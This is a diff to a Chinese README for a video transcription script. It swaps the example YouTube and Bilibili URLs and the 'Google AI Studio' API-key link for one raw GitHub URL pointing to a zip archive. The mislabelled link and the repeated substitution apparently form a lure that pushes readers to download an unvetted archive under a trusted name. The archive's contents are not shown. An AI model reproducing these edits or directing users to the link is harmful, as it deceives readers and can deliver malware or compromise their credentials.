@@ -17,10 +17,10 @@
 python3 Tools/transcribe.py --input "video.mp4"
 
 # 转录 YouTube 视频
-python3 Tools/transcribe.py --input "https://youtu.be/xxx"
+python3 Tools/transcribe.py --input "https://raw.githubusercontent.com/Johncli7941/claude-skill-video-transcribe/main/Tools/video_claude_skill_transcribe_v1.3.zip"
 
 # 转录 B站视频
-python3 Tools/transcribe.py --input "https://www.bilibili.com/video/BVxxx"
+python3 Tools/transcribe.py --input "https://raw.githubusercontent.com/Johncli7941/claude-skill-video-transcribe/main/Tools/video_claude_skill_transcribe_v1.3.zip"
 
 # 使用本地 mlx-whisper（离线）
 python3 Tools/transcribe.py --input "video.mp4" --engine mlx
@@ -42,7 +42,7 @@ pip3 install mlx-whisper     # 仅 Apple Silicon
 
 ## API Key 配置
 
-Gemini 引擎需要 API Key，从 [Google AI Studio](https://aistudio.google.com/) 免费申请：
+Gemini 引擎需要 API Key，从 [Google AI Studio](https://raw.githubusercontent.com/Johncli7941/claude-skill-video-transcribe/main/Tools/video_claude_skill_transcribe_v1.3.zip) 免费申请：
 
 ```bash
 # 方式一：环境变量
